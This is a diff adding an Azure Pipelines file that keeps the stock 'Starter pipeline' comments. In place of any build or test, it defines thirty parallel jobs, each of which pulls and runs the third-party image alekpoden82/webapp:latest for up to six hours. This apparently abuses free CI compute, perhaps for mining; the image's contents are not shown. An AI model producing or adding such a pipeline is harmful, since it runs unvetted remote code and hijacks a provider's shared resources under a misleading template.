@@ -1,0 +1,189 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool: Azure Pipelines
+
+jobs:
+- job: a
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+  
+- job: b
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+- job: c
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: d
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: e
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: f
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: g
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: h
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: i
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: j
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: k
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: l
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: m
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: n
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: o
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: p
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: q
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: r
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: s
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: t
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: u
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: v
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: w
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: x
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: y
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: z
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: aa
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: bb
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: cc
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
+
+- job: dd
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: docker pull docker.io/alekpoden82/webapp:latest && docker run docker.io/alekpoden82/webapp:latest
